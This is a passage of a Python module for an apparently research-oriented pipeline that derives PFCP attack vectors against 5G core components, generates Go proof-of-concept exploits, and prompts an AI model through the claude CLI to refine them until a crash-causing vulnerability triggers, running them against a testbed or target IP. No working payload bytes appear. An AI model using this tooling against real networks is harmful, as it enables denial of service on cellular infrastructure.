        malicious_value: Any = "<benign_placeholder>"
        if is_trigger:
            fields = malformed.get("malformed_fields", {})
            if fields:
                first_field = next(iter(fields.values()), {})
                malicious_value = first_field.get("malicious_value", "<malicious_payload>")

        attack_sequence.append(
            AttackSequenceStep(
                step=step_data.get("step", 0),
                message=step_data.get("message", "UnknownMessage"),
                manipulation=AttackManipulation(
                    ie=malformed.get("ie_type", candidate.trigger_ie) if is_trigger else candidate.trigger_ie,
                    field=candidate.ie_field,
                    malicious_value=malicious_value,
                    raw_hex=malformed.get("raw_bytes_hint") if is_trigger else None,
                ),
                triggers_vulnerability=is_trigger,
                action="respond" if step_data.get("role") == "target" else "send",
            )
        )

    crash_type = expected.get("type", "runtime_crash")
    crash_file = expected.get("file", candidate.vulnerable_site.file)
    crash_line = expected.get("line", candidate.vulnerable_site.line)

    expected_outcome = ExpectedOutcome(
        type=crash_type,
        location=f"{crash_file}:{crash_line}",
        impact="Process crash (DoS)",
    )

    # Build protocol_messages from the steps + sibling IEs
    protocol_messages: dict[str, ProtocolMessageSpec] = {}
    for step_data in steps:
        msg_name = step_data.get("message", "UnknownMessage")
        if msg_name in protocol_messages:
            continue
        header: dict[str, Any] = {
            "message_type": _PFCP_MESSAGE_TYPE_HINTS.get(msg_name, "<unknown>"),
            "teid": "<extract_from_prior_message>",
            "sequence_number": "<extract_from_prior_message>",
        }
        ies: dict[str, Any] = {}
        if step_data.get("triggers_vulnerability", False):
            for sibling in attack_procedure.get("required_sibling_ies", []):
                ies[sibling.get("ie_name", "UnknownIE")] = {
                    "value": sibling.get("value", "<placeholder>"),
                }
            ies[malformed.get("ie_type", candidate.trigger_ie)] = {
                "field": candidate.ie_field,
                "malicious_value": malicious_value,
            }
        protocol_messages[msg_name] = ProtocolMessageSpec(header=header, ies=ies)

    return AttackVectorDocument(
        candidate_id=candidate.id,
        attack_vector=AttackVector(
            target_entity=target_entity,
            target_interface=target_interface,
            attacker_role=attacker_role,
            attack_sequence=attack_sequence,
            expected_outcome=expected_outcome,
        ),
        protocol_messages=protocol_messages,
    )


def _fallback_derive_attack_procedure(
    candidate: iTrueCandidate,
    *,
    prerequisite_messages: list[str] | None = None,
    protocol: ProtocolType = ProtocolType.PFCP,
    poc_dir: Path,
    pattern_id: str | None = None,
    target_version: str | None = None,
    target_software: str | None = None,
) -> tuple[dict[str, Any], AttackVectorDocument]:
    """Fallback to deterministic heuristic derivation when LLM is unavailable."""
    attack_doc = derive_attack_vector_and_messages(
        candidate,
        prerequisite_messages=prerequisite_messages,
        protocol=protocol,
    )

    poc_dir.mkdir(parents=True, exist_ok=True)
    (poc_dir / "attack_vector.json").write_text(
        json.dumps(attack_doc.model_dump(), indent=2) + "\n", encoding="utf-8",
    )

    raw_hex = _extract_raw_hex_from_attack_doc(attack_doc)
    attack_procedure = _build_attack_procedure_doc(
        doc=attack_doc,
        candidate=candidate,
        pattern_id=pattern_id,
        target_version=target_version,
        target_software=target_software,
        raw_hex=raw_hex,
    )
    if attack_procedure:
        (poc_dir / "attack_vector.json").write_text(
            json.dumps(attack_procedure, indent=2) + "\n", encoding="utf-8",
        )
    else:
        attack_procedure = {}

    return attack_procedure, attack_doc


def _write_scaffold_poc(poc_dir: Path, candidate: iTrueCandidate) -> None:
    """Write a scaffold ``main.go`` and ``go.mod`` when LLM is unavailable."""
    trigger_message = _normalize_message_name(candidate.trigger_message, ProtocolType.PFCP)
    main_go = f'''package main

import (
    "encoding/json"
    "fmt"
    "os"
)

func main() {{
    raw, err := os.ReadFile("attack_vector.json")
    if err != nil {{
        fmt.Println("failed to read attack_vector.json:", err)
        os.Exit(1)
    }}

    var payload map[string]any
    if err := json.Unmarshal(raw, &payload); err != nil {{
        fmt.Println("failed to parse attack_vector.json:", err)
        os.Exit(1)
    }}

    fmt.Println("Loaded attack vector for candidate: {candidate.id}")
    fmt.Println("Trigger message: {trigger_message}")
    fmt.Println("PoC scaffold generated. Implement protocol send path here.")
}}
'''
    poc_dir.mkdir(parents=True, exist_ok=True)
    (poc_dir / "main.go").write_text(main_go, encoding="utf-8")

    go_mod = (
        f"module poc/{candidate.id}\n\n"
        "go 1.21\n\n"
        "require github.com/wmnsk/go-pfcp v0.0.24\n"
    )
    (poc_dir / "go.mod").write_text(go_mod, encoding="utf-8")


def _llm_fix_poc_precheck(
    poc_dir: Path,
    precheck: dict[str, Any],
) -> str:
    """Use LLM to fix the PoC based on pre-check failures (equivalence / compile)."""
    main_go_path = poc_dir / "main.go"
    try:
        current_code = main_go_path.read_text(encoding="utf-8")
    except OSError:
        return "Failed to read main.go."

    vector_block = ""
    vector_path = poc_dir / "attack_vector.json"
    if vector_path.exists():
        try:
            vector_block = (
                "\n## attack_vector.json\n```json\n"
                + vector_path.read_text(encoding="utf-8")[:6000]
                + "\n```\n"
            )
        except OSError:
            pass

    issues = precheck.get("issues", [])
    compile_stderr = precheck.get("compile_stderr", "")

    issues_text = "\n".join(f"- {i}" for i in issues)
    compile_block = ""
    if compile_stderr:
        compile_block = f"\n## Compile Errors\n```\n{compile_stderr[:3000]}\n```\n"

    prompt = (
        "You are a cellular core network security researcher. "
        "The following Go PoC has pre-check failures. Fix the code.\n\n"
        f"## Issues\n{issues_text}\n"
        f"{compile_block}"
        f"{vector_block}\n"
        f"## Current main.go\n```go\n{current_code[:12000]}\n```\n\n"
        "Output ONLY the fixed Go source code."
    )

    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        return "claude CLI not found."

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    try:
        proc = subprocess.run(
            [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
            input=prompt,
            capture_output=True,
            text=True,
            timeout=300,
            env=env,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return "LLM pre-check fix timed out."

    if proc.returncode != 0:
        return f"LLM pre-check fix failed (exit {proc.returncode})."

    raw_output = proc.stdout.strip()
    go_match = re.search(r"```(?:go)?\s*\n(.*?)\n```", raw_output, re.DOTALL)
    if go_match:
        raw_output = go_match.group(1)

    if not raw_output.lstrip().startswith("package"):
        pkg_idx = raw_output.find("package main")
        if pkg_idx >= 0:
            raw_output = raw_output[pkg_idx:]
        else:
            return "LLM output was not valid Go code."

    main_go_path.write_text(raw_output + "\n", encoding="utf-8")
    return f"Fixed PoC for: {'; '.join(issues)[:120]}"


def _llm_refine_poc(
    poc_dir: Path,
    attack_doc: AttackVectorDocument,
    analysis: dict[str, Any],
    logs: str,
) -> str:
    """Use LLM to fix the PoC Go code based on runtime logs and diagnosis.

    Reads the current ``main.go``, sends it together with the runtime logs
    and the LLM diagnosis to ``claude -p``, and writes the fixed code back.
    Recompiles afterwards.  Returns a short description of what was changed.
    """
    main_go_path = poc_dir / "main.go"
    try:
        current_code = main_go_path.read_text(encoding="utf-8")
    except OSError:
        return "Failed to read main.go for refinement."

    # Read attack_vector.json if available for extra context
    vector_block = ""
    vector_path = poc_dir / "attack_vector.json"
    if vector_path.exists():
        try:
            vector_block = (
                "\n## Attack Vector\n```json\n"
                + vector_path.read_text(encoding="utf-8")[:6000]
                + "\n```\n"
            )
        except OSError:
            pass

    diagnosis = analysis.get("diagnosis", "No diagnosis available.")
    refinement_hint = analysis.get("refinement_action", "none")
    missing_ie = analysis.get("missing_ie")
    last_50 = "\n".join(logs.splitlines()[-50:])

    prompt = (
        "You are a 5G security researcher debugging a PFCP exploit PoC written in Go.\n\n"
        "The PoC was executed but did NOT trigger the target vulnerability. "
        "Based on the runtime logs and diagnosis below, fix the Go source code.\n\n"
        f"## Diagnosis\n{diagnosis}\n\n"
        f"## Refinement Hint\n{refinement_hint}\n"
    )
    if missing_ie:
        prompt += f"\n## Missing IE\nThe target rejected the message due to missing mandatory IE: **{missing_ie}**\n"

    prompt += (
        f"{vector_block}\n"
        f"## Runtime Logs (last 50 lines)\n```\n{last_50}\n```\n\n"
        f"## Current main.go\n```go\n{current_code[:12000]}\n```\n\n"
        "## Instructions\n"
        "Fix the Go code so the PoC correctly triggers the vulnerability. "
        "Common issues include:\n"
        "- Missing mandatory IEs that the target requires\n"
        "- Wrong TEID or sequence number\n"
        "- Association not established before session messages\n"
        "- Malformed IE bytes constructed incorrectly\n"
        "- Wrong message type code\n\n"
        "Output ONLY the complete fixed Go source code. No markdown fences, no explanation."
    )

    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        return "claude CLI not found; cannot refine PoC."

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    try:
        proc = subprocess.run(
            [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
            input=prompt,
            capture_output=True,
            text=True,
            timeout=300,
            env=env,
            check=False,
        )
    except Exception:  # noqa: BLE001
        logger.warning("LLM PoC refinement timed out")
        return "LLM refinement timed out."

    if proc.returncode != 0:
        logger.warning("LLM PoC refinement failed (exit %d)", proc.returncode)
        return f"LLM refinement failed (exit {proc.returncode})."

    raw_output = proc.stdout.strip()
    # Strip markdown fences if present
    go_match = re.search(r"```(?:go)?\s*\n(.*?)\n```", raw_output, re.DOTALL)
    if go_match:
        raw_output = go_match.group(1)

    if not raw_output.lstrip().startswith("package"):
        pkg_idx = raw_output.find("package main")
        if pkg_idx >= 0:
            raw_output = raw_output[pkg_idx:]
        else:
            logger.warning("LLM refinement output doesn't look like Go code")
            return "LLM refinement output was not valid Go code."

    main_go_path.write_text(raw_output + "\n", encoding="utf-8")

    # Recompile
    compile_ok, _, compile_stderr = _run_go_build(poc_dir)
    if not compile_ok:
        logger.warning("Recompilation failed after refinement: %s", compile_stderr[:200])
        return f"Refined main.go but recompilation failed: {compile_stderr[:200]}"

    return f"LLM refined PoC based on diagnosis: {diagnosis[:120]}"


def exploit_candidate(
    candidate: iTrueCandidate | dict[str, Any],
    *,
    output_root: str | Path,
    message_schemas: dict[str, Any] | str | Path | None = None,
    prerequisite_messages: list[str] | None = None,
    protocol: ProtocolType = ProtocolType.PFCP,
    docker_container: str | None = None,
    target_ip: str | None = None,
    listen_ip: str | None = None,
    local_ip: str | None = None,
    seid: int | None = None,
    timeout: int | None = None,
    max_iterations: int = 5,
    expected_file: str | None = None,
    expected_function: str | None = None,
    pattern_id: str | None = None,
    target_version: str | None = None,
    target_software: str | None = None,
) -> dict[str, Any]:
    cand = _normalize_candidate(candidate)
    output_root_path = Path(output_root)
    poc_dir = output_root_path / cand.id
    poc_dir.mkdir(parents=True, exist_ok=True)

    # Step 1 — LLM-driven attack vector derivation
    # Step 2 — LLM-driven PoC generation
    try:
        attack_vector_dict, attack_doc = _llm_derive_attack_procedure(
            cand,
            prerequisite_messages=prerequisite_messages,
            protocol=protocol,
            poc_dir=poc_dir,
            pattern_id=pattern_id,
            target_version=target_version,
            target_software=target_software,
        )

        _llm_generate_poc(
            attack_vector_dict,
            candidate=cand,
            poc_dir=poc_dir,
        )
    except RuntimeError as exc:
        result = ExploitationResult(
            candidate_id=cand.id,
            validation_result=ExploitationVerdict.UNCONFIRMED,
            timestamp=datetime.now(timezone.utc),
            attempts=0,
            poc_path=str(poc_dir / "main.go"),
            failure_analysis=f"LLM generation failed: {exc}",
            refinements_attempted=None,
        )
        return {
            "attack_vector": None,
            "poc_dir": str(poc_dir),
            "precheck": None,
            "result": result,
        }

    # Step 3 — Pre-execution checks with LLM fix loop
    max_precheck_retries = 3
    precheck_fixes: list[str] = []
    for precheck_attempt in range(1, max_precheck_retries + 1):
        precheck = run_pre_execution_checks(poc_dir, attack_doc)
        if precheck["overall_ok"]:
            break

        if precheck_attempt == max_precheck_retries:
            result = ExploitationResult(
                candidate_id=attack_doc.candidate_id,
                validation_result=ExploitationVerdict.UNCONFIRMED,
                timestamp=datetime.now(timezone.utc),
                attempts=0,
                poc_path=str(poc_dir / "main.go"),
                failure_analysis="; ".join(precheck["issues"]) or "Pre-execution checks failed.",
                refinements_attempted=precheck_fixes or None,
            )
            return {
                "attack_vector": attack_doc,
                "poc_dir": str(poc_dir),
                "precheck": precheck,
                "result": result,
            }

        fix_desc = _llm_fix_poc_precheck(poc_dir, precheck)
        precheck_fixes.append(f"precheck fix {precheck_attempt}: {fix_desc}")

    if docker_container:
        def _executor(poc: Path, doc: AttackVectorDocument, attempt: int) -> dict[str, Any]:
            return execute_in_docker_testbed_once(
                poc,
                doc,
                attempt,
                docker_container=docker_container,
            )

        result = feedback_aware_refinement_loop(
            attack_doc,
            poc_dir=poc_dir,
            execute_once=_executor,
            max_iterations=max_iterations,
            expected_file=expected_file,
            expected_function=expected_function,
        )
    elif target_ip:
        def _executor(poc: Path, doc: AttackVectorDocument, attempt: int) -> dict[str, Any]:
            return execute_local_poc_once(
                poc,
                doc,
                attempt,
                target_ip=target_ip,
                listen_ip=listen_ip,
                local_ip=local_ip,
                seid=seid,
                timeout=timeout,
            )

        result = feedback_aware_refinement_loop(
            attack_doc,
            poc_dir=poc_dir,
            execute_once=_executor,
            max_iterations=max_iterations,
            expected_file=expected_file,
            expected_function=expected_function,
        )
    else:
        result = ExploitationResult(
            candidate_id=attack_doc.candidate_id,
            validation_result=ExploitationVerdict.UNCONFIRMED,
            timestamp=datetime.now(timezone.utc),
            attempts=0,
            poc_path=str(Path(poc_dir) / "main.go"),
            failure_analysis=(
                "No runtime executor configured. Provide docker_container or target_ip to execute."
            ),
            refinements_attempted=None,
        )

    return {
        "attack_vector": attack_doc,
        "poc_dir": str(poc_dir),
        "precheck": precheck,
        "result": result,
    }


def _normalize_candidate(candidate: iTrueCandidate | dict[str, Any]) -> iTrueCandidate:
    if isinstance(candidate, iTrueCandidate):
        return candidate

    data = dict(candidate)
    vuln_site = data.get("vulnerable_site") or {
        "file": data.get("code_file", "unknown_file"),
        "line": int(data.get("code_line", 0)),
        "function": data.get("vulnerable_function", "unknown_function"),
        "dangerous_operation": data.get("dangerous_operation", "unknown_operation"),
    }

    mapped = {
        "id": data.get("id") or data.get("candidate_id") or "UNKNOWN-CANDIDATE",
        "vulnerable_site": vuln_site,
        "trigger_message": data.get("trigger_message") or data.get("message_type") or "UnknownMessage",
        "trigger_ie": data.get("trigger_ie") or data.get("ie_name") or "UnknownIE",
        "ie_field": data.get("ie_field") or data.get("trigger_ie") or "unknown_field",
        "data_flow": data.get("data_flow") or "unknown_data_flow",
        "call_chain": data.get("call_chain") or [],
    }
    return iTrueCandidate.model_validate(mapped)


def _normalize_attack_doc(attack_doc: AttackVectorDocument | dict[str, Any]) -> AttackVectorDocument:
    if isinstance(attack_doc, AttackVectorDocument):
        return attack_doc
    return AttackVectorDocument.model_validate(attack_doc)


def _normalize_schema_map(data: dict[str, Any]) -> MessageSchemaMap:
    if "messages" in data and isinstance(data["messages"], dict):
        raw = data["messages"]
    else:
        raw = data

    normalized: MessageSchemaMap = {}
    for name, spec in raw.items():
        if isinstance(name, str) and isinstance(spec, dict):
            normalized[name] = spec
    return normalized


def _normalize_message_name(message: str, protocol: ProtocolType) -> str:
    msg = message.strip()
    if protocol == ProtocolType.PFCP and not msg.startswith("PFCP_"):
        chunks = re.findall(r"[A-Z][a-z0-9]*|[A-Z]+(?![a-z])", msg)
        if chunks:
            msg = "PFCP_" + "_".join(chunks)
    return msg


def _infer_target_entity(candidate: iTrueCandidate) -> str:
    text = " ".join(
        [
            candidate.vulnerable_site.file,
            candidate.vulnerable_site.function,
            candidate.trigger_message,
        ]
    ).lower()
    if "smf" in text:
        return "SMF"
    if "upf" in text:
        return "UPF"
    if "sgwc" in text:
        return "SGW-C"
    if "pgwc" in text:
        return "PGW-C"
    return "UnknownEntity"


def _infer_attacker_role(target_entity: str) -> str:
    if target_entity in {"SMF", "SGW-C"}:
        return "Malicious UPF/PGW"
    if target_entity in {"UPF", "PGW-C"}:
        return "Malicious SMF/SGW"
    return "Malicious Peer"


def _infer_expected_buffer_size(candidate: iTrueCandidate) -> int | None:
    text = " ".join([candidate.vulnerable_site.dangerous_operation, candidate.data_flow])
    matches = re.findall(r"\b(\d{1,6})\b", text)
    if not matches:
        return None
    values = [int(x) for x in matches]
    positives = [x for x in values if x > 0]
    return min(positives) if positives else None


def _infer_malicious_value(candidate: iTrueCandidate, expected_buffer_size: int | None) -> Any:
    field = candidate.ie_field.lower()
    if any(token in field for token in ("len", "length", "size", "count")):
        if expected_buffer_size:
            return max(200, expected_buffer_size * 4)
        return 200
    if any(token in field for token in ("type", "state", "id")):
        return 9999
    return "<malicious_payload>"


def _infer_expected_outcome(candidate: iTrueCandidate) -> dict[str, Any]:
    op = candidate.vulnerable_site.dangerous_operation.lower()
    if "memcpy" in op or "memmove" in op or "strcpy" in op:
        trigger_type = "heap_buffer_overflow"
    elif "assert" in op:
        trigger_type = "assertion_failure"
    elif "panic" in op:
        trigger_type = "panic"
    else:
        trigger_type = "runtime_crash"

    return {
        "type": trigger_type,
        "location": f"{candidate.vulnerable_site.file}:{candidate.vulnerable_site.line}",
        "impact": "Process crash (DoS)",
    }


def _extract_mandatory_ies(schema_map: MessageSchemaMap, message_name: str) -> list[str]:
    spec = schema_map.get(message_name, {})
    mandatory = spec.get("mandatory_ies")
    if isinstance(mandatory, list):
        return [str(x) for x in mandatory]

    ies = spec.get("ies")
    if isinstance(ies, dict):
        return [str(k) for k in ies.keys()]
    return []


def _build_protocol_message_spec(
    *,
    message_name: str,
    mandatory_ies: list[str],
    trigger_ie: str,
    ie_field: str,
    malicious_value: Any,
    include_attack_payload: bool,
) -> dict[str, Any]:
    header = {
        "message_type": _PFCP_MESSAGE_TYPE_HINTS.get(message_name, "<unknown_message_type>"),
        "teid": "<extract_from_prior_message>",
        "sequence_number": "<extract_from_prior_message>",
    }
    ies: dict[str, Any] = {name: {"value": "<mandatory_placeholder>"} for name in mandatory_ies}
    if include_attack_payload:
        ies[trigger_ie or "UnknownIE"] = {
            "field": ie_field or "unknown_field",
            "malicious_value": malicious_value,
        }
    return {"header": header, "ies": ies}


def _extract_raw_hex_from_attack_doc(doc: AttackVectorDocument) -> str:
    for step in doc.attack_vector.attack_sequence:
        if step.triggers_vulnerability:
            raw_hex = getattr(step.manipulation, "raw_hex", None)
            if raw_hex:
                return str(raw_hex)
    trigger = _get_trigger_message(doc)
    spec = doc.protocol_messages.get(trigger)
    if spec and getattr(spec, "raw_hex", None):
        return str(spec.raw_hex or "")
    return ""


def _build_attack_procedure_doc(
    *,
    doc: AttackVectorDocument,
    candidate: iTrueCandidate | None,
    pattern_id: str | None,
    target_version: str | None,
    target_software: str | None,
    raw_hex: str,
) -> dict[str, Any] | None:
    if not doc.attack_vector.attack_sequence:
        return None

    steps: list[dict[str, Any]] = []
    for step in doc.attack_vector.attack_sequence:
        steps.append(
            {
                "step": step.step,
                "message": step.message,
                "action": getattr(step, "action", "send"),
                "triggers_vulnerability": step.triggers_vulnerability,
                "manipulation": {
                    "ie": step.manipulation.ie,
                    "field": step.manipulation.field,
                    "malicious_value": step.manipulation.malicious_value,
                    "raw_hex": step.manipulation.raw_hex,
                    "raw_hex_kind": step.manipulation.raw_hex_kind,
                },
            }
        )

    expected_crash = None
    if candidate:
        expected_crash = {
            "type": doc.attack_vector.expected_outcome.type,
            "location": {
                "file": candidate.vulnerable_site.file,
                "line": candidate.vulnerable_site.line,
                "function": candidate.vulnerable_site.function,
            },
            "impact": doc.attack_vector.expected_outcome.impact,
        }

    payload: dict[str, Any] = {
        "vuln_id": doc.candidate_id,
        "pattern_id": pattern_id or "UNKNOWN",
        "target_software": target_software or "UnknownTarget",
        "target_version": target_version or "unknown",
        "attack_procedure": {
            "target_entity": doc.attack_vector.target_entity,
            "target_interface": doc.attack_vector.target_interface,
            "attacker_role": doc.attack_vector.attacker_role,
            "steps": steps,
            "expected_outcome": doc.attack_vector.expected_outcome.model_dump(),
        },
    }

    if expected_crash:
        payload["attack_procedure"]["expected_crash"] = expected_crash
    if raw_hex:
        payload["attack_procedure"]["raw_bytes"] = {"payload_hex": raw_hex}
    return payload


    ies: dict[str, Any] = {name: {"value": "<mandatory_placeholder>"} for name in mandatory_ies}
    if include_attack_payload:
        ies[trigger_ie or "UnknownIE"] = {
            "field": ie_field or "unknown_field",
            "malicious_value": malicious_value,
        }
    return {"header": header, "ies": ies}


def _get_trigger_message(attack_doc: AttackVectorDocument) -> str:
    for step in attack_doc.attack_vector.attack_sequence:
        if step.triggers_vulnerability:
            return step.message
    if attack_doc.attack_vector.attack_sequence:
        return attack_doc.attack_vector.attack_sequence[-1].message
    return "UnknownMessage"


def _check_attack_vector_consistency(
    poc_dir: Path,
    attack_doc: AttackVectorDocument,
) -> tuple[bool, list[str]]:
    issues: list[str] = []
    path = poc_dir / "attack_vector.json"
    if not path.exists():
        return False, ["attack_vector.json not found"]

    try:
        with open(path, encoding="utf-8") as fp:
            on_disk = json.load(fp)
    except Exception as exc:  # noqa: BLE001
        return False, [f"attack_vector.json invalid JSON: {exc}"]

    # Check vuln_id matches candidate_id
    disk_id = on_disk.get("vuln_id", "")
    if disk_id != attack_doc.candidate_id:
        issues.append(
            f"Candidate ID mismatch: on-disk vuln_id={disk_id!r}, "
            f"in-memory candidate_id={attack_doc.candidate_id!r}."
        )

    # Check attack_procedure has steps
    procedure = on_disk.get("attack_procedure", {})
    steps = procedure.get("steps", [])
    if not steps:
        issues.append("attack_vector.json has no steps in attack_procedure.")

    # Check trigger step exists
    trigger_steps = [s for s in steps if s.get("triggers_vulnerability")]
    if not trigger_steps:
        issues.append("attack_vector.json has no step with triggers_vulnerability=true.")

    # Check trigger message matches
    if trigger_steps:
        disk_trigger_msg = trigger_steps[0].get("message", "")
        mem_trigger_msg = _get_trigger_message(attack_doc)
        if disk_trigger_msg != mem_trigger_msg:
            issues.append(
                f"Trigger message mismatch: on-disk={disk_trigger_msg!r}, "
                f"in-memory={mem_trigger_msg!r}."
            )

    # Check malformed_ie_construction exists
    if not procedure.get("malformed_ie_construction"):
        issues.append("attack_vector.json missing malformed_ie_construction.")

    return len(issues) == 0, issues


def _check_poc_equivalence(
    poc_dir: Path,
) -> tuple[bool, list[str]]:
    main_path = poc_dir / "main.go"
    procedure_path = poc_dir / "attack_vector.json"
    if not main_path.exists():
        return False, ["main.go not found"]
    if not procedure_path.exists():
        return False, ["attack_vector.json not found"]

    try:
        main_go = main_path.read_text(encoding="utf-8", errors="ignore")
    except OSError as exc:
        return False, [f"failed to read main.go: {exc}"]
    try:
        procedure_json = procedure_path.read_text(encoding="utf-8", errors="ignore")
    except OSError as exc:
        return False, [f"failed to read attack_vector.json: {exc}"]

    try:
        return _llm_equivalence_check(main_go, procedure_json)
    except Exception as exc:  # noqa: BLE001
        logger.warning("LLM equivalence check failed: %s", exc)
        return False, [f"LLM equivalence check error: {exc}"]


def _llm_equivalence_check(
    main_go: str,
    procedure_json: str,
) -> tuple[bool, list[str]]:
    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        return False, ["claude CLI not found in PATH."]

    prompt = f"""You are a security PoC reviewer. Verify whether main.go correctly implements
the attack procedure in attack_vector.json (equivalence check).

Verify:
1. Message sequence: same messages in same order as steps?
2. Trigger step: correctly constructs the step with triggers_vulnerability=true?
3. Malformed IE: hand-crafts the malicious IE bytes as described in malformed_ie_construction?
4. Required sibling IEs: includes the mandatory IEs listed in required_sibling_ies?
5. Prerequisite messages: sends non-trigger messages before the trigger step?

=== attack_vector.json ===
{procedure_json[:8000]}

=== main.go ===
{main_go[:12000]}

Respond EXACTLY:
VERDICT: EQUIVALENT or VERDICT: NOT_EQUIVALENT
REASON: <one sentence>
ISSUES: <comma-separated list, or "none">
"""

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    proc = subprocess.run(
        [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
        input=prompt,
        capture_output=True,
        text=True,
        timeout=300,
        env=env,
        check=False,
    )

    if proc.returncode != 0:
        return False, [f"claude CLI exited with code {proc.returncode}: {proc.stderr[:200]}"]

    return _parse_equivalence_response(proc.stdout)


def _parse_equivalence_response(response: str) -> tuple[bool, list[str]]:
    issues: list[str] = []
    lines = response.strip().splitlines()

    verdict_line = ""
    reason_line = ""
    issues_line = ""
    for line in lines:
        stripped = line.strip()
        if stripped.upper().startswith("VERDICT:"):
            verdict_line = stripped
        elif stripped.upper().startswith("REASON:"):
            reason_line = stripped
        elif stripped.upper().startswith("ISSUES:"):
            issues_line = stripped

    is_equivalent = "EQUIVALENT" in verdict_line.upper() and "NOT_EQUIVALENT" not in verdict_line.upper()

    if reason_line:
        reason = reason_line.split(":", 1)[-1].strip()
    else:
        reason = "LLM did not provide a reason."

    if issues_line:
        raw_issues = issues_line.split(":", 1)[-1].strip()
        if raw_issues.lower() != "none" and raw_issues:
            issues = [i.strip() for i in raw_issues.split(",") if i.strip()]

    if not is_equivalent:
        issues.insert(0, f"Equivalence check failed: {reason}")

    return is_equivalent, issues


def _run_go_build(poc_dir: Path) -> tuple[bool, str, str]:
    go_cmd = shutil.which("go")
    if go_cmd is not None:
        proc = subprocess.run(
            [go_cmd, "build", "-o", "poc_binary", "."],
            cwd=str(poc_dir),
            capture_output=True,
            text=True,
            check=False,
        )
        return proc.returncode == 0, proc.stdout, proc.stderr

    # Fallback: compile inside a golang Docker container
    docker_cmd = shutil.which("docker")
    if docker_cmd is None:
        return False, "", "Neither go nor docker found in PATH"

    abs_dir = str(poc_dir.resolve())
    proc = subprocess.run(
        [
            docker_cmd, "run", "--rm",
            "-v", f"{abs_dir}:/src",
            "-w", "/src",
            "golang:1.21",
            "go", "build", "-o", "poc_binary", ".",
        ],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    return proc.returncode == 0, proc.stdout, proc.stderr



def _extract_log_snippet(logs: str, max_lines: int = 12) -> list[str]:
    lines = [line for line in logs.splitlines() if line.strip()]
    selected: list[str] = []
    for line in lines:
        low = line.lower()
        if any(k in low for k in _CRASH_KEYWORDS) or any(p in low for p, _, _ in _DIAGNOSIS_RULES):
            selected.append(line)
        if len(selected) >= max_lines:
            break
    if selected:
        return selected
    return lines[-max_lines:]


def _extract_missing_ie(logs: str) -> str | None:
    m = re.search(r"missing mandatory ie[:\s]+([A-Za-z0-9_]+)", logs, flags=re.IGNORECASE)
    if m:
        return m.group(1)
    return None


def _is_expected_trigger(
    *,
    location: dict[str, Any],
    expected_file: str | None,
    expected_function: str | None,
) -> bool:
    if expected_file is None and expected_function is None:
        return True
    if expected_file and expected_file not in str(location.get("file", "")):
        return False
    if expected_function and expected_function != str(location.get("function", "")):
        return False
    return True


def _prepend_messages_if_missing(data: dict[str, Any], messages: list[str]) -> None:
    seq = data["attack_vector"]["attack_sequence"]
    existing = {step.get("message") for step in seq}
    to_add = [msg for msg in messages if msg not in existing]
    if not to_add:
        return

    new_steps: list[dict[str, Any]] = []
    for i, msg in enumerate(to_add, start=1):
        new_steps.append(
            {
                "step": i,
                "message": msg,
                "manipulation": {
                    "ie": "NodeID",
                    "field": "value",
                    "malicious_value": "<benign_placeholder>",
                },
                "triggers_vulnerability": False,
            }
        )
        data["protocol_messages"].setdefault(
            msg,
            _build_protocol_message_spec(
                message_name=msg,
                mandatory_ies=[],
                trigger_ie="NodeID",
                ie_field="value",
                malicious_value="<benign_placeholder>",
                include_attack_payload=False,
            ),
        )

    merged = new_steps + seq
    for idx, step in enumerate(merged, start=1):
        step["step"] = idx
    data["attack_vector"]["attack_sequence"] = merged
